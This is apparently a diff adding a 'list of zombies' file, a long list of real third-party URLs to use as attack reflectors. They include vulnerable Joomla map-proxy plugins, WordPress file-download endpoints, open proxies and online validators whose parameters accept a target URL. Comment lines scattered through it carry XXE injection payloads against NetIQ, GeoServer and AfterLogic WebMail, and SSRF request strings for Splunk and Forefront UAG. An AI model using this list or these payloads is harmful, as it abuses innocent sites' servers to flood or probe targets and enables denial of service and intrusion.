@@ -1,0 +1,240 @@
+# The list of zombies
+http://regex.info/exif.cgi?url=
+http://anonymouse.org/cgi-bin/anon-www.cgi/
+http://www.google.com/translate?u=
+http://validator.w3.org/check?uri=
+http://translate.google.com/translate?u=
+#http://jigsaw.w3.org/css-validator/validator?uri=
+#http://validator.w3.org/checklink?uri=
+#http://www.w3.org/RDF/Validator/ARPServlet?URI=
+http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=
+http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=
+http://feedvalidator.org/check.cgi?url=
+http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=
+http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=
+http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=
+http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=
+http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=
+http://about42.nl/www/showheaders.php;POST;about42.nl.txt
+http://browsershots.org;POST;browsershots.org.txt
+http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=
+http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
+http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=
+http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=
+http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=
+http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=
+http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt
+http://web-sniffer.net/?url=
+http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=
+http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=
+http://translate.yandex.net/tr-url/ru-uk.uk/
+http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=
+http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=
+http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=
+http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=
+http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
+http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
+http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=
+http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=
+http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=
+http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=
+http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=
+http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=
+http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=
+http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=
+http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+#http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=
+#http://validator.w3.org/nu/?doc=
+http://check-host.net/check-http?host=
+http://www.netvibes.com/subscribe.php?url=
+http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=
+http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=
+http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=
+http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=
+http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=
+http://www.demarcation.org.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+http://tv1861.net/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+http://www.idace.ce.gov.br/sitio/plugins/system/plugin_googlemap2_proxy.php?url=
+http://ncs3.prohost.pl/ESTO/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://services.w3.org/tidy/tidy?docAddr=
+http://bao-sushi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.limitless-coiffure.com/plugins/system/plugin_googlemap2_proxy.php?url=
+http://finnrelax.hu/fitnesz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://hotelsixty3.com/plugins/system/plugin_googlemap2_proxy.php?url=
+# XXE Injection via POST:
+# http://site/script;XML;XML.txt
+# AoF (SSRF) vulnerability in WordPress
+# http://site;WP;WordPress.txt
+http://screenshot.com.ua/makeit.cgi;POST;about42.nl.txt
+http://www.dimensionebimbi.it/DB/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.molineroava.com/en/plugins/system/plugin_googlemap2_proxy.php?url=
+http://adeptlock.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://voda.dn.ua/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+# XXE Injection in NetIQ Access:
+# https://site:8443/nps/servlet/webacc?taskId=fw.PreviewObjectFilter&nextState=initialState&merge=fw.TCPreviewFilter&query=<!DOCTYPE+x+[%0a<!ENTITY+xxe+SYSTEM+"http://site">%0a]><query><container>%26xxe%3b</container><subclasses>false</subclasses></query>
+# XXE Injection in GeoServer: Take value of !C! from http://site/wfs?request=GetCapabilities
+# http://site/wfs?request=GetFeature&service=WFS&version=1.0.0&typename=!C!&FILTER=<?xml+version="1.0"+encoding="ISO-8859-1"?>%0a<!DOCTYPE+x+[%0a<!ENTITY+xxe+SYSTEM+"http://site">%0a]><Filter><PropertyIsEqualTo><PropertyName>&xxe;</PropertyName><Literal>Brussels</Literal></PropertyIsEqualTo></Filter>
+http://www.theatredebelleville.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://cnnp.if.ua/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://loretta-altabadia.com/plugins/content/plugin_googlemap2_proxy.php?url=
+http://trolebus.gob.ec/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+http://www.polarissupreme.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+# XXE Injection in EMC Cloud Tiering Appliance
+# http://site/api/login;XML;EMC.txt
+http://proxy2974.my-addr.org/myaddrproxy.php/
+http://dacd.win/b.php?b=4&u=
+http://www.ecocenter-vg.ru/plugins/content/plugin_googlemap2_proxy.php?url=
+http://econom.govvrn.ru/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.sandp.co.th/plugins/system/plugin_googlemap2_proxy.php?url=
+# XXE Injection in AfterLogic WebMail Pro
+# http://site/webmail/spellcheck.aspx?xml=<?xml+version="1.0"+encoding="utf-8"?>%0a<!DOCTYPE+x+[%0a<!ENTITY+%25+xxe+SYSTEM+"http://site">%0a%25xxe%3b]>
+# XXE Injection in Oracle BI Publisher
+# http://site/xmlpserver/services/ServiceGateway;XML;Oracle.txt
+http://theparkshelton.com/wp-content/plugins/filedownload/download.php?path=
+http://jazzdrummerworld.com/wp-content/plugins/filedownload/download.php?path=
+http://enlivendesigns.us/wp-content/plugins/filedownload/download.php?path=
+http://kanzlei-ronnenberg.de/wp-content/plugins/filedownload/download.php?path=
+http://earthday.ca/wp-content/plugins/filedownload/download.php?path=
+http://floridaintlcollege.com/wp-content/plugins/filedownload/download.php?path=
+http://minib.pl/wp-content/plugins/filedownload/download.php?path=
+http://www.illinoiseyeinstitute.org/wp-content/plugins/filedownload/download.php?path=
+http://medicalestetic.ro/wp-content/plugins/filedownload/download.php?path=
+http://www.bigler-finearts.com/wp-content/plugins/filedownload/download.php?path=
+#https://dzedzich.org/wp-content/plugins/filedownload/download.php?path=
+http://dvv-international.by/wp-content/plugins/filedownload/download.php?path=
+http://www.audi-tdi-chronik.de/wp-content/plugins/filedownload/download.php?path=
+http://www.sourcelab-plasma.com/wp-content/plugins/filedownload/download.php?path=
+http://www.ishieldz.com/new/wp-content/plugins/filedownload/download.php?path=
+http://www.gangrecordingstudio.com/wp-content/plugins/filedownload/download.php?path=
+http://eskimon.fr/wp-content/plugins/filedownload/download.php?path=
+http://www.robolift.at/wp-content/plugins/filedownload/download.php?path=
+http://www.darioianes.it/site/wp-content/plugins/filedownload/download.php?path=
+http://www.zetatekindia.com/wp-content/plugins/filedownload/download.php?path=
+# XXE Injection in SAP NetWeaver AS Java
+# http://site/_tc~monitoring~webservice~web/ServerNodesWSService;XML;SAP NetWeaver.txt
+http://www.proxy2016.top/index.php?q=
+http://www.proxy2017.top/index.php?q=
+http://ntc-convention.com.ua/wp-content/plugins/filedownload/download.php?path=
+http://tikoblog.de/wp-content/plugins/filedownload/download.php?path=
+http://i4ultimate.com/wp-content/plugins/filedownload/download.php?path=
+http://nets.16mb.com/wp-content/plugins/filedownload/download.php?path=
+http://phidiastavern.com/wp-content/plugins/filedownload/download.php?path=
+http://noorussabahresidency.com/wp-content/plugins/filedownload/download.php?path=
+http://vims-geo.ru/wp-content/plugins/filedownload/download.php?path=
+http://ent-graz.com/wordpress/wp-content/plugins/filedownload/download.php?path=
+http://cathygnarchdiocese.org/wp-content/plugins/filedownload/download.php?path=
+http://dundalktidytowns.com/wp-content/plugins/filedownload/download.php?path=
+http://bh.kbs6.de/wp-content/plugins/filedownload/download.php?path=
+http://conference-research.com/wp-content/plugins/filedownload/download.php?path=
+http://ghostproxy.eu/browse.php?u=
+http://yavz.xyz/b.php?u=
+http://iwaz.gq/browse.php?u=
+http://shinyproxy.com/browse.php?u=
+http://bypasstool.gq/browse.php?u=
+http://blackjacklive.de/wp-content/plugins/filedownload/download.php?path=
+http://buehler-hartmetall.de/BuehlerHartmetallEX/wp-content/plugins/filedownload/download.php?path=
+http://audytpavlenko.com.ua/wp-content/plugins/filedownload/download.php?path=
+http://talevtechnology.com/bg/wp-content/plugins/filedownload/download.php?path=
+http://drlindaskincare.com/wp-content/plugins/filedownload/download.php?path=
+http://cadmm.org/wp-content/plugins/filedownload/download.php?path=
+http://decktours.de/portal/content/wp-content/plugins/filedownload/download.php?path=
+http://psychotherapie-dr-maeng.de/wp-content/plugins/filedownload/download.php?path=
+http://diskont.at/wp-content/plugins/filedownload/download.php?path=
+http://parador-online.de/wp-content/plugins/filedownload/download.php?path=
+# XXE Injection in CyberPower Systems PowerPanel
+# http://site/client/ppbe.xml;XML;CyberPower.txt
+#https://kub-berlin.org/formularprojekt/wp-content/plugins/filedownload/download.php?path=
+http://portraits-hellerau.com/wp-content/plugins/filedownload/download.php?path=
+http://previdea.it/wordpress/wp-content/plugins/filedownload/download.php?path=
+http://jah-zg.ch/wp-content/plugins/filedownload/download.php?path=
+http://gbp.zakrzowek.gmina.pl/wp-content/plugins/filedownload/download.php?path=
+http://vdl-web.de/wp-content/plugins/filedownload/download.php?path=
+http://youtuber-relations.de/wp-content/plugins/filedownload/download.php?path=
+http://waldzeit.ch/wp-content/plugins/filedownload/download.php?path=
+http://fishmed.iimcb.gov.pl/wp-content/plugins/filedownload/download.php?path=
+http://coubeche.com/wp-content/plugins/filedownload/download.php?path=
+http://fitnesspassie.nl/wp-content/plugins/filedownload/download.php?path=
+http://3dportal.nl/wp-content/plugins/filedownload/download.php?path=
+http://ferienzauber.net/wp-content/plugins/filedownload/download.php?path=
+http://dpsg-abbas.de/wp-content/plugins/filedownload/download.php?path=
+http://gesundheitstreff-tuwas.de/wp-content/plugins/filedownload/download.php?path=
+http://plombieres-les-bains.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
+http://beta.zanzibarportfolio.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
+http://materialesdeconstruccionmadrid.es/wp-content/plugins/filedownload/download.php?path=
+http://le-maitre-refleur.scifo.fr/wp-content/plugins/filedownload/download.php?path=
+http://dr.spitzbart.com/wp-content/plugins/filedownload/download.php?path=
+http://mahantarashe.ir/wp-content/plugins/filedownload/download.php?path=
+http://qoe.club/wp-content/plugins/filedownload/download.php?path=
+http://reisefotosammlung.de/wp-content/plugins/filedownload/download.php?path=
+http://health.cat/downloadoc.php?url=
+http://bioremede.com/downloadoc.php?url=
+#https://ready.mobi/api/v1/prism/proxy?prismid=51941&url=
+http://im.ufrj.br/~maurizio.monge/kanjax/proxy.php?url=
+#https://netroomz.com.au/hotel/gmap-proxy.aspx?path=gmap-proxy.aspx&url=
+http://theill.com/library/proxy.asp?url=
+# XXE Injection in Qlikview
+# https://site/AccessPoint.aspx;XML;Qlikview.txt
+http://i1.wp.com/
+http://i2.wp.com/
+http://i3.wp.com/
+http://mundoprimaria.com/wp-content/plugins/descargas-email/descargar.php?url=
+http://ccam-va.com/wp-content/plugins/rss-reader-widget/feed.php?url=
+#https://docs.google.com/viewer?url=
+http://finpl.gov.ua/plugins/system/plugin_googlemap2_proxy.php?url=
+http://gr8.com.ua/plugins/content/plugin_googlemap2_proxy.php?url=
+http://les-belles-echappees.com/plugins/content/plugin_googlemap2_proxy.php?url=
+http://dosuccess.com.mx/dos/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.tupelorecycling.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://koniewo.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://blauwwit-roosendaal.nl/badminton/plugins/content/plugin_googlemap2_proxy.php?url=
+http://cistiace-sluzby.sk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
+# SSRF in Splunk Enterprise
+# http://site/en-US/alerts/launcher?eai%3Aacl.app=launcher&eai%3Aacl.owner=*&severity=*&search=1&alerts_id=
+http://pokl.up.gov.pl/plugins/system/plugin_googlemap2_proxy.php?url=
+http://centrumzorza.pl/hotel//plugins/content/plugin_googlemap2_proxy.php?url=
+http://swpl.org/plugins/content/plugin_googlemap2_proxy.php?url=
+http://www.mmadvocatuur.nl/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://coopcarlet.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+# SSRF in Microsoft Forefront Unified Access Gateway 2010
+# http://site/uniquesig697e96fe58e5694d9b118768d8189a4c/uniquesig0/InternalSite/InitParams.aspx?referrer=/InternalSite/StartApp.asp&resource%5Fid=8B92B86E36904E2FA83C890F8C864A50&login%5Ftype=0&site%5Fname=test&secure=0&URLHASH=47c74c53%2Dfaae%2D41ae%2D89f1%2D1eb6eff34091&orig%5Furl=
+http://www.scuolestatalialassio.it/joomla/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://smkarwiny.pl/autoinstalator/joomla/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://nyaetage.se/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://backside.se/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://upiekszalnia.pl/strona//plugins/content/plugin_googlemap2_proxy.php?url=
+http://cise.com/portal/plugins/content/plugin_googlemap2_proxy.php?url=
+http://morsangliere.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
+http://www.hotelristorantegenziana.com/plugins/content/plugin_googlemap2_proxy.php?url=
+http://buffetcity.com.sg/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
